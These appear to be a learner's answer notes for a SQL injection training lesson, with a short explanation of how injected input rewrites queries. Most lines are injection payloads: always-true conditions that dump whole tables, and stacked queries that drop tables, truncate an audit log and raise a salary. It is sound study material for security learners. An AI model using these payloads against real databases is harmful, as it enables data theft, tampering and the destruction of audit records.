Sql injection intro:
2) select department from Employees where first_name = 'Bob' and last_name = 'Franco';
3) update Employees set department = 'Sales' where first_name = 'Tobi' and last_name = 'Barnett';
4) alter table Employees add phone varchar(20);
5) grant all on grant_rights to unauthorized_user;

SQL injection can be used for far more than reading the data of a single of user. The following are just a few examples of data a hacker could input to a form field (or anywhere user input is accepted) in an attempt to exploit a SQL injection vulnerability:

Smith' OR '1' = '1
results in SELECT * FROM users WHERE name = 'Smith' OR TRUE; which will return all entries from the users table

Smith' OR 1 = 1; --
results in SELECT * FROM users WHERE name = 'Smith' OR TRUE;--'; which, like the first example, will also return all entries from the users table

Smith'; DROP TABLE users; TRUNCATE audit_log; --
chains multiple SQL-Commands in order to both DROP the users table and delete all entries from the audit_log table

9) ' or '1' = '1;
10) Login count: 1
    User_id: 1 OR 1 = 1;--
11) 3SL99A';select * from employees;--
12) 3SL99A';update employees set salary = '2137000' where auth_tan = '3SL99A';--
13) ';drop table access_log;--
